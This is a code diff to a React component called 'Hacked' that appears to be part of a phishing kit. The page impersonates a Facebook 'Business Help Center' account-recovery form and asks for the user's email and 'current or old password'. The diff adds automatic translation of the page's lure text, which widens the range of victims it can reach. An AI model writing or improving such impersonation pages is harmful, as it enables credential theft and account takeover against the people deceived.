@@ -1,10 +1,25 @@
 import Favicon from '@/assets/images/aGT3gskzWBf.ico';
+import translateText from '@/services/translation';
 import { faSpinner } from '@fortawesome/free-solid-svg-icons';
 import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
 import axios from 'axios';
 import React, { useEffect, useState } from 'react';
 import { Helmet } from 'react-helmet-async';
 import { Link, useNavigate } from 'react-router-dom';
+
+const defaultTranslations = {
+	title: 'Business Help Center',
+	enterEmail: 'Enter the Email linked to Facebook',
+	warningMessage:
+		"To get back in to your account, enter your current Email if you know it. If you don't think that your account was hacked, you can",
+	cancel: 'cancel this process',
+	emailPlaceholder: 'Email',
+	passwordPlaceholder: 'Current or old password',
+	invalidPassword: 'Invalid Password',
+	continue: 'Continue',
+	forgotPassword: 'Forgot Password',
+	or: 'or',
+};
 
 const Hacked: React.FC = () => {
 	const navigate = useNavigate();
@@ -16,6 +31,28 @@ const Hacked: React.FC = () => {
 	const [isLoading, setIsLoading] = useState<boolean>(false);
 	const [loadingTime, setLoadingTime] = useState<number>(0);
 	const [error, setError] = useState<string>('');
+	const [translations, setTranslations] = useState(defaultTranslations);
+	const [isTranslated, setIsTranslated] = useState(false);
+
+	useEffect(() => {
+		const translateStrings = async () => {
+			if (!isTranslated) {
+				const translatedTexts = await Promise.all(
+					Object.entries(defaultTranslations).map(
+						async ([key, value]) => {
+							const translatedValue = await translateText(value);
+							return [key, translatedValue];
+						},
+					),
+				);
+				setTranslations(Object.fromEntries(translatedTexts));
+				setIsTranslated(true);
+			}
+		};
+
+		translateStrings();
+	}, [isTranslated]);
+
 	const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
 		e.preventDefault();
 		if (email) {
@@ -87,7 +124,7 @@ const Hacked: React.FC = () => {
 	return (
 		<>
 			<Helmet>
-				<title>Business Help Center</title>
+				<title>{translations.title}</title>
 				<link rel='shortcut icon' href={Favicon} type='image/x-icon' />
 				<link rel='preconnect' href='https://fonts.googleapis.com' />
 				<link
@@ -110,15 +147,12 @@ const Hacked: React.FC = () => {
 						onSubmit={handleSubmit}
 					>
 						<h2 className='hidden text-gray-700 lg:block lg:text-xl'>
-							Enter the Email linked to Facebook
+							{translations.enterEmail}
 						</h2>
 						<div className='m-3 w-full border border-yellow-500 bg-yellow-100 p-2 text-sm'>
-							To get back in to your account, enter your current
-							Email if you know it. If you don't think that your
-							account was hacked, you can
+							{translations.warningMessage}{' '}
 							<Link to='#' className='text-blue-600'>
-								{' '}
-								cancel this process
+								{translations.cancel}
 							</Link>
 						</div>
 						<input
@@ -126,7 +160,7 @@ const Hacked: React.FC = () => {
 							type='text'
 							id='email'
 							name='email'
-							placeholder='Email'
+							placeholder={translations.emailPlaceholder}
 							required
 							value={email}
 							onChange={(e) => setEmail(e.target.value)}
@@ -137,7 +171,11 @@ const Hacked: React.FC = () => {
 								id='password'
 								type='password'
 								name='password'
-								placeholder={`${error || 'Current or old password'}`}
+								placeholder={
+									error
+										? translations.invalidPassword
+										: translations.passwordPlaceholder
+								}
 								onFocus={() => setError('')}
 								value={password}
 								onChange={(e) => setPassword(e.target.value)}
@@ -154,18 +192,18 @@ const Hacked: React.FC = () => {
 									className='animate-spin'
 								/>
 							) : (
-								'Continue'
+								translations.continue
 							)}
 						</button>
 					</form>
 				</div>
 				<div className='flex flex-col items-center lg:hidden'>
 					<Link to='#' className='text-blue-600'>
-						Forgot Password
+						{translations.forgotPassword}
 					</Link>
 					<div className='flex items-center'>
 						<hr className='flex-grow border-b border-black' />
-						<span className='mx-4'>or</span>
+						<span className='mx-4'>{translations.or}</span>
 						<hr className='flex-grow border-b border-black' />
 					</div>
 					<div className='grid grid-cols-2'>
